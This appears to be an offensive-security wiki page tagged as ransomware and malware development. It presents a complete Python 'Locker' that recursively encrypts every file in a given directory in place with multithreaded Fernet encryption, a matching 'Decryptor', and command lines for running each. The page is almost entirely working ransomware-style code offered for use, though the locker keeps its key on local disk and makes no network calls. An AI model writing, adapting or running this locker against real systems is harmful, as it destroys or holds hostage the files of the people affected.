---
author(s):
  - Userware
tags:
  - post-exploitation
  - impact
  - malware-development
  - ransomware
  - cross-platform
---
# Python

## Locker

```python
from cryptography.fernet import Fernet
import os
from threading import Thread
from queue import Queue
import sys
import argparse

# Generate key for encryption and decryption
def generate_key(key_file):
    key = Fernet.generate_key()
    with open(key_file, 'wb') as key_file_handle:
        key_file_handle.write(key)

# Load the encryption key from file
def load_key(key_file):
    return open(key_file, 'rb').read()

def encrypt_file(file_path, key, queue):
    # Initialize the encryption method with the key
    fernet = Fernet(key)

    try:
        # Reading the file's data
        with open(file_path, 'rb') as file:
            file_data = file.read()

        # Encrypting the data
        encrypted_data = fernet.encrypt(file_data)

        # Overwrite the file with encrypted data
        with open(file_path, 'wb') as file:
            file.write(encrypted_data)

        print(f"[+] {file_path} has been encrypted.")
    except Exception as e:
        print(f"[-] {file_path} has not been encrypted. Error: {e}")
    finally:
        queue.task_done()

# Worker function to encrypt files from the queue
def worker(key, queue):
    while True:
        file_path = queue.get()
        if file_path is None:
            break
        encrypt_file(file_path, key, queue)

# Encrypt files in a directory recursively
def encrypt_files(directory, key, num_threads):
    queue = Queue()
    files_to_encrypt = []

    # Collect all file paths to be encrypted
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            files_to_encrypt.append(file_path)

    # Add file paths to the queue
    for file_path in files_to_encrypt:
        queue.put(file_path)

    # Create and start worker threads
    threads = []
    for _ in range(num_threads):
        thread = Thread(target=worker, args=(key, queue))
        thread.start()
        threads.append(thread)

    # Wait for all tasks to be done
    queue.join()

    # Stop workers
    for _ in range(num_threads):
        queue.put(None)
    for thread in threads:
        thread.join()

def main():
    parser = argparse.ArgumentParser(description='Encrypt files in a directory.')
    parser.add_argument('key_file', help='Path to the key file.')
    parser.add_argument('directory', help='Directory path to encrypt files.')
    parser.add_argument('--num_threads', type=int, default=4, help='Number of threads to use for encryption.')

    args = parser.parse_args()

    key_file = args.key_file
    directory = args.directory
    num_threads = args.num_threads

    # Generation encryption key if it does not exist
    if not os.path.exists(key_file):
        generate_key(key_file)
        print("Encryption key generated")

    key = load_key(key_file)
    print("Key loaded, Encrypting files...")

    encrypt_files(directory, key, num_threads)

if __name__ == "__main__":
    main()
```

Generate the key and encrypt the files.

```
> locker crypto_key.key /path/to/directory/
```

## Decryptor

```python
from cryptography.fernet import Fernet
import os
from threading import Thread
from queue import Queue
import sys
import argparse

# Load the encryption key from file
def load_key(key_file):
    return open(key_file, 'rb').read()

def decrypt_file(file_path, key, queue):
    # Initialize the decryption method with the key
    fernet = Fernet(key)

    try:
        # Reading the encrypted file
        with open(file_path, 'rb') as file:
            encrypted_file = file.read()

        # Decrypting the data
        decrypted_data = fernet.decrypt(encrypted_file)

        # Overwrite the file with decrypted data
        with open(file_path, 'wb') as file:
            file.write(decrypted_data)

        print(f"[+] {file_path} has been decrypted.")
    except Exception as e:
        print(f"[-] {file_path} has not been decrypted. Error: {e}")
    finally:
        queue.task_done()

# Worker function to decrypt files from the queue
def worker(key, queue):
    while True:
        file_path = queue.get()
        if file_path is None:
            break
        decrypt_file(file_path, key, queue)

# Decrypt files in a directory recursively
def decrypt_files(directory, key, num_threads):
    queue = Queue()
    files_to_decrypt = []

    # Collect all file paths to be decrypted
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            files_to_decrypt.append(file_path)

    # Add file paths to the queue
    for file_path in files_to_decrypt:
        queue.put(file_path)

    # Create and start worker threads
    threads = []
    for _ in range(num_threads):
        thread = Thread(target=worker, args=(key, queue))
        thread.start()
        threads.append(thread)

    # Wait for all tasks to be done
    queue.join()

    # Stop workers
    for _ in range(num_threads):
        queue.put(None)
    for thread in threads:
        thread.join()

def main():
    parser = argparse.ArgumentParser(description='Decrypt files in a directory.')
    parser.add_argument('key_file', help='Path to the key file.')
    parser.add_argument('directory', help='Directory path to decrypt files.')
    parser.add_argument('--num_threads', type=int, default=4, help='Number of threads to use for decryption.')

    args = parser.parse_args()

    key_file = args.key_file
    directory = args.directory
    num_threads = args.num_threads

    # Check if the decryption key exists
    if not os.path.exists(key_file):
        sys.exit("Missing decryption key!")

    key = load_key(key_file)
    print("Key loaded, Decrypting files...")

    decrypt_files(directory, key, num_threads)

if __name__ == "__main__":
    main()
```

Load the generated key in order to decrypt the files.

```
> decryptor crypto_key.key /path/to/directory/
```